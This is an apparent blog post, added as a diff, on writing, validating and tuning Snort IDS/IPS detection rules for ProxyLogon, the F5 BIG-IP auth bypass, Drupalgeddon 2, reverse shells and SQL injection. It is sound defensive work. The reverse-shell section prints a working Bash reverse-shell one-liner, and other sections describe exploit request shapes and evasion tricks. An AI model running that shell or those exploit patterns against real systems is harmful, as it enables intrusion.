@@ -1,0 +1,247 @@
+---
+title: "Writing Snort Rules That Actually Catch Attacks"
+date: "2026-01-22"
+excerpt: "Building and tuning Snort detection for real CVE exploits and live reverse shells — in both passive IDS and inline IPS modes — and validating every rule against PCAP."
+category: "Detection Engineering"
+tags: ["Detection Engineering", "Network Security", "IDS/IPS", "Snort"]
+author: "Kalyan Gopalam"
+---
+
+I spent a few weeks last winter doing something that sounds simple and turned out to be anything but: writing Snort rules that catch real attacks without drowning me in false positives. Not the toy rules you find in tutorials that fire on the literal string `attack` in a packet, but signatures for actual, well-documented exploits — ProxyLogon, the F5 BIG-IP authentication bypass, Drupalgeddon 2, SQL injection, and the reverse shells that attackers drop once they are in.
+
+The goal of the project was to understand detection engineering from the packet up. Anyone can download a community ruleset and turn it on. What I wanted was to sit with the raw bytes of an exploit on the wire, understand exactly what made that traffic distinguishable from legitimate traffic, write a rule that keyed on that difference, and then prove the rule worked by replaying captured traffic through it. I ran Snort two ways: passively, as a classic intrusion detection system tapping a copy of the traffic, and inline, as an intrusion prevention system that could actually drop packets using Linux `NFQUEUE`. Each rule got validated against live packet captures in Wireshark, and each one got tuned until it stopped lying to me.
+
+This post is the long version of what I learned — part walkthrough, part field notes, and part argument for why writing your own detection teaches you things no amount of reading can.
+
+## IDS versus IPS, and why the distinction is not academic
+
+Before any rules, you have to decide what the sensor is allowed to do. That single decision shapes everything downstream: how you tune, how much false-positive risk you can tolerate, and how badly a mistake hurts.
+
+In passive **IDS** mode, Snort sees a copy of the traffic. You feed it packets off a SPAN port, a network tap, or in my lab a mirrored interface, and it watches. When a rule matches, it logs an alert. That is the entire consequence. If the rule is wrong and fires on benign traffic, you get a noisy log and an annoyed analyst. Nothing breaks. The traffic that triggered the alert has already arrived at its destination regardless of what Snort thinks about it. IDS is an observer with no hands.
+
+In inline **IPS** mode, Snort sits *in the path* of the traffic. Packets flow into Snort, get inspected, and only leave if Snort permits them. Now a rule can `drop` a packet, `reject` a connection with a TCP reset or ICMP unreachable, or `block` an entire session. The upside is obvious: you are not just watching the attack, you are stopping it. The downside is equally obvious and much scarier: a false positive in IPS mode does not produce a noisy log, it produces an outage. A bad rule can sever a legitimate connection, break an application, or take a service offline. The cost of being wrong went from "irritating" to "I just dropped production traffic."
+
+On Linux, the cleanest way I found to run Snort inline is through **`NFQUEUE`**, a Netfilter feature that hands packets from the kernel's iptables (or nftables) pipeline up to a userspace program for a verdict. You insert a rule in the firewall that says "send matching packets to queue number 0," and Snort attaches to that queue, inspects each packet, and returns a verdict of accept or drop back to the kernel. The plumbing looks roughly like this:
+
+```text title="nfqueue-setup.sh" showLineNumbers
+# Send forwarded traffic into NFQUEUE 0 for Snort to inspect
+iptables -I FORWARD -j NFQUEUE --queue-num 0
+
+# Run Snort attached to that queue in inline mode
+snort -Q --daq nfq --daq-var queue=0 -c /etc/snort/snort.lua -i eth0
+```
+
+The `-Q` flag puts Snort in inline mode, and the `--daq nfq` selects the NFQUEUE data acquisition module. The packet's fate is now in Snort's hands. This is exactly the architecture that makes IPS powerful and dangerous in equal measure: you have wedged a pattern-matching engine into the forwarding path of your network. Every rule you write is now a potential failure point for connectivity.
+
+I built every signature in IDS mode first. You write the rule with the `alert` action, confirm it fires on the attack and stays quiet on everything else, and *only then* do you consider promoting it to a `drop` rule inline. Going straight to `drop` is how you learn detection engineering by causing incidents, and I preferred to learn it the other way.
+
+## The anatomy of a Snort rule
+
+A Snort rule reads like a sentence once you know the grammar, and every rule has the same two parts: a **header** and a set of **options** in parentheses.
+
+The header is the coarse filter. It answers: what action, what protocol, what addresses and ports, and in which direction. Consider this header:
+
+`alert tcp $EXTERNAL_NET any -> $HOME_NET 443`
+
+That reads as: when you see TCP traffic from any external address on any source port, going to a home-network address on port 443, consider this rule. The `->` is the direction operator; Snort also supports `<>` for bidirectional matching. The `$EXTERNAL_NET` and `$HOME_NET` tokens are variables you define in the configuration so you do not hardcode address ranges into every rule. The action at the front — `alert`, `log`, `drop`, `reject` — is what makes the same rule body behave as detection or prevention depending on mode.
+
+The options, inside the parentheses, are where the actual detection logic lives. They are a semicolon-separated list of keywords. The ones I leaned on most:
+
+- `msg` — the human-readable alert text. This is documentation; write it like the on-call analyst at 3 a.m. is the only audience that matters.
+- `flow` — constrains matching by connection state and direction, for example `flow:established,to_server`. This is one of the most important false-positive killers, because it stops a rule from matching stray packets that are not part of a real, established session in the right direction.
+- `content` — the heart of most signatures: a byte or string pattern to find in the payload. You can pin it with `http_uri`, `http_header`, `http_client_body`, and similar sticky buffers in modern Snort so the match only applies to the relevant part of an HTTP transaction.
+- `pcre` — a Perl-compatible regular expression for when a fixed `content` string is not expressive enough. Powerful, but expensive, so you gate it behind a cheap `content` match first.
+- `nocase` — case-insensitive matching, essential for HTTP where header and method casing varies.
+- `reference` — a pointer to a CVE or advisory so the rule explains itself.
+- `sid` and `rev` — the unique signature ID and its revision number. Local rules conventionally use SIDs of one million or above to avoid colliding with the official ranges.
+
+A useful mental model: the header decides *whether Snort even bothers looking*, and the options decide *whether it fires*. Good rules push as much selectivity as possible into the header and the cheap options — protocol, port, `flow`, a discriminating `content` anchor — before reaching for expensive `pcre`. A rule that does a regular-expression scan on every packet on the wire is a rule that will eventually cost you throughput.
+
+With the grammar established, here are the five threats I built detection for, each with the network signature that makes it catchable.
+
+## ProxyLogon — CVE-2021-26855
+
+ProxyLogon is the server-side request forgery half of the Exchange exploit chain that defined early 2021. The flaw lives in the Exchange front-end, and the property that makes it detectable is wonderfully specific: the exploit works by sending a request to the Exchange server with a forged `Cookie` header that lets an unauthenticated attacker impersonate the server to its own back end. The tell is a request to an Exchange endpoint carrying a cookie of the form `X-AnonResource-Backend` (and related `X-BEResource` cookie values), which legitimate clients simply do not send.
+
+The network signature, then, is an HTTP request to the Exchange autodiscover or EWS paths with that anomalous cookie present. Here is the kind of rule I wrote:
+
+```text title="local.rules" showLineNumbers
+alert tcp $EXTERNAL_NET any -> $HOME_NET [443,444] (
+    msg:"EXPLOIT ProxyLogon CVE-2021-26855 SSRF X-AnonResource-Backend cookie";
+    flow:established,to_server;
+    http_header;
+    content:"Cookie|3a|"; nocase;
+    content:"X-AnonResource-Backend"; nocase; distance:0;
+    reference:cve,2021-26855;
+    classtype:web-application-attack;
+    sid:1000001; rev:2;
+)
+```
+
+Walking through the logic: the `flow:established,to_server` clause ensures we only look at request-direction packets in a real session, not random fragments. The `http_header` sticky buffer scopes the `content` matches to the HTTP headers specifically, so we are not accidentally matching the cookie string in a request body or some unrelated payload. The first `content` finds the `Cookie:` header itself — the `|3a|` is the hex byte for a colon, written that way to be unambiguous — and the second `content`, with `distance:0`, requires the suspicious cookie name to appear after it. The CVE reference makes the rule self-documenting.
+
+What I learned tuning this one: the cookie name alone is a strong indicator, but scoping it to the header buffer matters. An early version of my rule used a bare `content` with no buffer, and during PCAP validation I realized that a sufficiently weird but legitimate request body could in principle carry that string. Pinning it to `http_header` tightened the rule to exactly the part of the request the exploit actually abuses.
+
+## F5 BIG-IP iControl REST authentication bypass — CVE-2022-1388
+
+CVE-2022-1388 is one of my favorite examples to teach with because the exploit is almost embarrassingly elegant, and that elegance is exactly what makes it detectable. The iControl REST interface on F5 BIG-IP could be tricked into treating a request as authenticated by abusing how it handled the `Connection` header together with an `X-F5-Auth-Token`. An attacker sends a request to the `/mgmt/tm/util/bash` endpoint with `Connection: keep-alive, X-F5-Auth-Token` and a forged or empty auth token, and the server's request-smuggling-adjacent confusion lets the request through as if it were locally authenticated — at which point the attacker has remote code execution as root.
+
+The signature is a POST to that management endpoint with the distinctive `Connection` header value naming the auth token header. Legitimate iControl REST clients do not list `X-F5-Auth-Token` inside the `Connection` header. Here is the rule:
+
+```text title="local.rules" showLineNumbers
+alert tcp $EXTERNAL_NET any -> $HOME_NET [443,8443] (
+    msg:"EXPLOIT F5 BIG-IP iControl REST auth bypass CVE-2022-1388";
+    flow:established,to_server;
+    http_method; content:"POST"; nocase;
+    http_uri; content:"/mgmt/tm/util/bash"; nocase;
+    http_header; content:"Connection|3a|"; nocase;
+    content:"X-F5-Auth-Token"; nocase; distance:0; within:60;
+    reference:cve,2022-1388;
+    classtype:web-application-attack;
+    sid:1000002; rev:3;
+)
+```
+
+The detection stacks three independent confirmations: the HTTP method is `POST`, the URI is the bash-execution management endpoint, and the `Connection` header improperly names the auth-token header. The `within:60` on the final `content` says the suspicious token name must appear within 60 bytes of the `Connection:` header start, which keeps the two `content` matches genuinely associated rather than matching a `Connection` header in one place and the token name somewhere unrelated.
+
+The tuning lesson here was about specificity earning you safety. Because the URI `/mgmt/tm/util/bash` is so specific to BIG-IP administration and the header combination is so unusual, this rule is one of the few I was comfortable promoting to a `drop` action inline. A legitimate administrator simply does not produce this exact request shape, so the false-positive risk of blocking it is close to zero. That is the dream scenario for IPS: a signature where the malicious pattern has no benign twin.
+
+## Drupalgeddon 2 — CVE-2018-7600
+
+Drupalgeddon 2 is a remote code execution vulnerability in Drupal's form-rendering subsystem. The root cause is that Drupal's Form API processed certain array keys beginning with `#` as renderable properties, and an attacker could smuggle a callable and its arguments into a request through specially crafted parameter names. The classic exploitation targets the user-registration endpoint and uses parameter names containing `#post_render`, `#markup`, `#type`, or the `mail` element with an injected callback like `exec` or `passthru`.
+
+The detectable signature is an HTTP POST (or a GET with crafted query parameters) to a Drupal endpoint such as `/user/register` carrying parameter names that contain the `#` render-property markers. Those `#`-prefixed keys in form parameters are the smoking gun.
+
+```text title="local.rules" showLineNumbers
+alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (
+    msg:"EXPLOIT Drupalgeddon2 CVE-2018-7600 render array injection";
+    flow:established,to_server;
+    http_uri; content:"/user/register"; nocase;
+    http_client_body; content:"|23|post_render"; nocase;
+    pcre:"/(%23|#)(post_render|markup|lazy_builder)/i";
+    reference:cve,2018-7600;
+    classtype:web-application-attack;
+    sid:1000003; rev:2;
+)
+```
+
+Here is the place where I had to reach for `pcre`, and it illustrates the discipline of gating it. The cheap `content` match for `|23|post_render` — the `|23|` is the hex byte for `#` — runs first and fast. Only if that matches does Snort evaluate the more expensive regular expression, which catches both the URL-encoded `%23` and the literal `#` form of the render-property names. This ordering matters: by anchoring on the cheap fixed string first, I avoid running the regex against every body of every HTTP request on the wire. The exploit can encode the `#` in several ways depending on the tooling, so the regex earns its keep by covering the encodings, but it only runs when the fixed-string anchor already suggests something is wrong.
+
+During validation this rule taught me about encoding evasion directly. My first version only matched the literal `#`. When I replayed a PCAP where the exploit had URL-encoded the parameter names as `%23`, the rule sat there silently. That silence was the lesson: a signature that matches one encoding of an input is not a signature for the attack, it is a signature for one tool's default behavior. The regex covering both forms is what turned it into actual detection.
+
+## Reverse shells
+
+Exploits get you in; reverse shells are how attackers stay and operate. After landing code execution through any of the vulnerabilities above, a common next move is to have the compromised host connect *outbound* to the attacker and hand them an interactive shell. Detecting the exploit is detecting the break-in; detecting the reverse shell is detecting the burglar already walking around inside.
+
+Reverse shells are harder to signature than exploits because the traffic is more variable, but they leave behavioral fingerprints. The classic Bash reverse-shell one-liner redirects a shell's input and output to a TCP socket; when that shell first connects, an interactive prompt or an `id`/`uid=` command result often crosses the wire in cleartext if the channel is not encrypted. A common payload looks like this — and I am keeping it in a code fence precisely because writing shell redirection operators in prose is both unreadable and a way to break a Markdown build:
+
+```text title="reverse-shell-example.sh" showLineNumbers
+# Illustrative Bash reverse shell payload (lab use only)
+bash -i >& /dev/tcp/10.10.10.5/4444 0>&1
+```
+
+For an unencrypted reverse shell, a serviceable behavioral signature keys on the command output that an attacker almost always produces immediately — the output of `id`, which contains the unmistakable `uid=` prefix followed by group information — flowing on a connection that the internal host initiated outbound to an external address on an unusual port.
+
+```text title="local.rules" showLineNumbers
+alert tcp $HOME_NET any -> $EXTERNAL_NET !80:443 (
+    msg:"POLICY possible reverse shell - id command output to_client";
+    flow:established,from_server;
+    content:"uid="; nocase;
+    content:"gid="; nocase; distance:0; within:40;
+    pcre:"/uid=\d+\([a-z_][a-z0-9_-]*\)\s+gid=\d+/i";
+    classtype:trojan-activity;
+    sid:1000004; rev:4;
+)
+```
+
+The header is doing real work here: traffic originating from `$HOME_NET` going to `$EXTERNAL_NET` on a port that is *not* 80 through 443 is already suspicious for an internal server, because a server initiating outbound connections to arbitrary external ports is unusual. The `flow:established,from_server` clause — combined with that header direction — captures the data coming back on the reverse channel. The stacked `content` matches for `uid=` and `gid=` within 40 bytes of each other, refined by the `pcre` that demands the actual structure of an `id` output, is what separates this from a random packet that happens to contain `uid=`.
+
+This is the rule that taught me the most about false positives, because behavioral detection is inherently fuzzier than exploit detection. The string `uid=` shows up in legitimate traffic constantly — JSON APIs, query strings, logging endpoints. My first attempt fired on a benign internal application that passed a `uid=` query parameter, and the alert log filled with garbage. The fixes were layered: requiring `gid=` in close proximity, demanding the parenthesized username structure that the real `id` command produces, and constraining the direction and ports in the header. Each constraint shaved off a category of false positive. The rule that survived is much narrower than the rule I started with, and that narrowing is the entire craft.
+
+I want to be honest about a limitation: this rule only works on cleartext channels. A reverse shell tunneled over TLS, or one that base64-encodes its traffic, sails right past a content-based signature. I cover that gap explicitly in the evasion section, because pretending a content rule catches encrypted shells would be exactly the kind of false confidence detection engineering is supposed to eliminate.
+
+## SQL injection
+
+SQL injection is the oldest threat on this list and in some ways the hardest to signature cleanly, because the malicious input lives in the same place — request parameters — as enormous volumes of legitimate input, and the SQL syntax that constitutes an attack also appears in benign text. Detection here is an exercise in accepting that you cannot catch everything and choosing patterns that catch a lot while flagging little.
+
+The signatures I used target the structural hallmarks of injection attempts: the classic `' OR '1'='1` tautology, `UNION SELECT` clauses used to exfiltrate data from other tables, and SQL comment sequences like `-- ` or `/*` used to truncate the original query. These appear in the query string or request body.
+
+```text title="local.rules" showLineNumbers
+alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (
+    msg:"WEB-ATTACK SQL injection UNION SELECT in URI";
+    flow:established,to_server;
+    http_uri;
+    content:"union"; nocase;
+    content:"select"; nocase; distance:0; within:40;
+    pcre:"/union(\s|\/\*.*?\*\/|\+|%20)+select/i";
+    classtype:web-application-attack;
+    sid:1000005; rev:3;
+)
+```
+
+The `UNION SELECT` rule is the more reliable of my SQLi signatures because that two-keyword combination, in that order, in a URI, is a strong injection indicator — legitimate applications rarely pass `union select` as user input. Once again the cheap `content` matches gate the expensive `pcre`, and the regex is built to defeat a specific evasion: attackers break up `UNION SELECT` with inline comments (`UNION/**/SELECT`), extra whitespace, or URL-encoded spaces (`%20`) to dodge naive string matches. The regex accepts comments, plus signs, and encoded spaces as valid separators between the two keywords, so the obvious obfuscations do not slip through.
+
+The tautology and comment-based patterns were harder and I treated them with more suspicion. A rule that fires on `or 1=1` will eventually fire on someone's perfectly legitimate search for a math expression or a chunk of source code pasted into a form field. In IDS mode I kept those broader patterns enabled because a false alert is cheap. I never promoted them to `drop` inline, because the false-positive risk of blocking a legitimate request that happens to contain a SQL-shaped substring is too high. This split — strict, droppable rules for unambiguous attacks; broad, alert-only rules for fuzzy patterns — became the organizing principle of the whole ruleset.
+
+## PCAP-driven validation and killing false positives
+
+Writing a rule is a hypothesis. Validation is the experiment, and the experiment is non-negotiable. For every signature I followed the same loop, and skipping any step is how you ship a rule that does not work.
+
+First, capture or obtain a PCAP containing the actual exploit traffic. For the CVEs I worked from public proof-of-concept exploits fired in an isolated lab, capturing the full exchange. I opened each capture in **Wireshark** and read the bytes — not a summary, the actual HTTP request, the actual headers, the actual payload — until I could point at the exact bytes that distinguished the attack from a normal request. You cannot write a signature for a pattern you have not seen with your own eyes, and Wireshark's "Follow HTTP Stream" view was where most of my rule logic actually originated.
+
+Second, replay the PCAP through Snort offline and confirm the rule fires. Snort reads a capture file directly:
+
+```text title="validate.sh" showLineNumbers
+# Run a single ruleset against a capture and read the alerts
+snort -c /etc/snort/snort.lua -R /etc/snort/rules/local.rules \
+      -r captures/proxylogon-exploit.pcap -A alert_fast -q
+```
+
+If the alert does not fire, the rule is wrong — and at this stage being wrong is free, because I am replaying a file, not watching production. This is exactly where the Drupalgeddon encoding gap surfaced: the rule passed against the literal-`#` PCAP and silently failed against the `%23`-encoded one, and only running both captures revealed it.
+
+Third — and this is the step people skip — replay a large capture of *benign* traffic through the same rule and confirm it stays silent. A rule that catches the attack is half a rule. A rule that catches the attack and ignores everything else is a whole one. I kept a corpus of normal HTTP, normal internal traffic, and normal API calls precisely to run this negative test. Every false positive that showed up here was a defect to fix before the rule went anywhere near inline mode. The reverse-shell `uid=` rule went through four revisions against benign traffic before it stopped misfiring, and the revision number in the SID (`rev:4`) is a literal count of that struggle.
+
+The tuning techniques that did the heavy lifting:
+
+- **Tighten `flow`.** Adding `flow:established,to_server` or `from_server` eliminated a whole class of false matches on out-of-state packets. Many of my early false positives were the rule matching a pattern in traffic that was not even part of a real session in the relevant direction.
+- **Scope to the right buffer.** Moving a `content` match from the raw payload into `http_uri`, `http_header`, or `http_client_body` removed false positives caused by the pattern appearing in an irrelevant part of the transaction.
+- **Require co-occurrence.** Demanding two or more `content` matches in proximity (`distance` and `within`) turned weak single-indicator rules into strong multi-indicator ones. A single suspicious token is a coincidence; three of them in the right structure is an attack.
+- **Gate expensive checks.** Putting a cheap fixed-string `content` in front of every `pcre` kept performance sane and reduced spurious regex matches.
+
+## Evasion gaps I could not close
+
+Honesty about what a signature does *not* catch is the difference between detection engineering and security theater. Every rule I wrote has gaps, and I documented them deliberately.
+
+**Encryption defeats content matching, full stop.** All of my HTTP rules inspect cleartext. Against TLS, Snort sees an opaque encrypted stream and none of the `content` matches apply unless the sensor sits behind TLS termination or has visibility into decrypted traffic. The reverse-shell rule is even more exposed: any attacker who wraps their shell in TLS, SSH, or even simple base64 encoding renders the `uid=`/`gid=` signature blind. Content-based network detection is a cleartext discipline, and most serious attackers are not operating in cleartext anymore.
+
+**Encoding and obfuscation are an arms race.** I closed the `%23` gap on Drupalgeddon and the comment-injection gap on SQLi, but those were the encodings I knew to look for. Double-encoding, alternate character sets, chunked transfer encoding, and HTTP request smuggling can all reshape an attack's bytes enough to slip a signature that was not specifically built to normalize them. A content signature is only as good as the set of evasions its author anticipated.
+
+**Behavioral signatures have a false-positive floor.** The reverse-shell rule will never be perfectly clean, because the patterns it keys on legitimately occur. There is an irreducible tension between catching the variable behavior of a reverse shell and not flagging the variable behavior of normal systems. I narrowed it as far as I could; I could not narrow it to zero.
+
+**Low-and-slow and fragmentation.** An attacker who spreads an exploit across many packets, or who paces requests to stay under rate thresholds, can complicate matching. Snort's stream reassembly handles a lot of this, but it is configuration-dependent, and a signature author who assumes perfect reassembly can be surprised.
+
+The honest summary is that these signatures are excellent against the known, cleartext form of each exploit and a useful layer against everyone else — but they are a layer, not a wall.
+
+## Deploying inline: cautions earned the hard way
+
+Promoting a rule from `alert` to `drop` is the moment detection becomes prevention, and it is the moment a mistake becomes an outage. My rules for crossing that line, in the order I learned to respect them:
+
+**Earn the drop with specificity.** Only signatures with effectively no benign twin became `drop` rules. The F5 rule qualified: the exact URI and header combination has no legitimate equivalent. The SQLi tautology rule never qualified: too much legitimate traffic could resemble it. If you cannot articulate why a legitimate request would never match, you have not earned the right to drop on it.
+
+**Soak in IDS mode first.** Before any rule went inline, it ran in alert-only mode against live traffic for a meaningful period. If it stayed quiet on real benign traffic over time, it was a candidate for `drop`. If it produced even occasional false alerts, it stayed an alert. Production traffic is more varied and stranger than any test corpus, and the soak period is where that strangeness reveals itself safely.
+
+**Mind the failure mode.** Because inline Snort sits in the forwarding path via `NFQUEUE`, you have to decide what happens if Snort fails or falls behind. A `fail-closed` configuration that drops traffic Snort cannot inspect can turn a Snort crash into a network outage; fail-open means an attacker who can crash or overload your sensor can also blind it. Choose deliberately.
+
+**Watch performance.** Every `pcre` runs on matching traffic, and inline that cost is paid in the path of real packets. The gating discipline — cheap `content` before expensive `pcre` — is not just about reducing false positives; inline, it is about not turning your IPS into a latency source.
+
+## What writing my own rules actually taught me
+
+I could have downloaded the official Snort community rules and gotten detection for most of these CVEs without writing a line. The reason I did not is that the public rule is the answer to the test, and copying it teaches you nothing about the subject. Sitting in Wireshark and finding the exact bytes that betray ProxyLogon, then encoding that observation into a `content` match, then watching it fail against an encoding I had not anticipated, then fixing it, then proving it silent against benign traffic — that loop is where the understanding lives.
+
+The deliverable for the project was a documented set of rules with their detection logic, the evasion gaps for each, and recommended IPS policy changes describing which rules were safe to drop inline and which had to stay alert-only. But the real output was a way of thinking. A signature is a falsifiable claim about what an attack looks like on the wire, and a claim you have not tested against both attack and benign traffic is not detection, it is hope. The difference between a rule that catches attacks and a rule that catches your own foot is entirely in the validation, and the validation is the part no tutorial does for you.
+
+## References
+
+- CVE-2021-26855 (Microsoft Exchange ProxyLogon SSRF): https://nvd.nist.gov/vuln/detail/CVE-2021-26855
+- CVE-2022-1388 (F5 BIG-IP iControl REST authentication bypass): https://nvd.nist.gov/vuln/detail/CVE-2022-1388
+- CVE-2018-7600 (Drupalgeddon 2 remote code execution): https://nvd.nist.gov/vuln/detail/CVE-2018-7600
